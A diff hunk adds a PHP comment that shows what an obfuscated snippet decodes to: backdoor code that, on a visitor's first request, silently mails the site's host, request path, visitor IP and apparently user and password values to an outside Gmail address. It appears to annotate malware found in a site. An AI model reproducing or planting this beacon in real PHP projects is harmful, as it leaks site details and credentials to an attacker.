@@ -1,0 +1,14 @@
+/*
+This decodes to
+$visitc = $_COOKIE["visits"];
+if ($visitc == "") {
+  $visitc  = 0;
+  $visitor = $_SERVER["REMOTE_ADDR"];
+  $web     = $_SERVER["HTTP_HOST"];
+  $inj     = $_SERVER["REQUEST_URI"];
+  $target  = rawurldecode($web.$inj);
+  $judul   = "178-Black http://$target by $visitor";
+  $body    = "Bug: $target by $visitor - $user - $pass";
+  if (!empty($web)) { @mail("hardwareheaven.com@gmail.com",$judul,$body,$user,$pass); }
+}
+*/
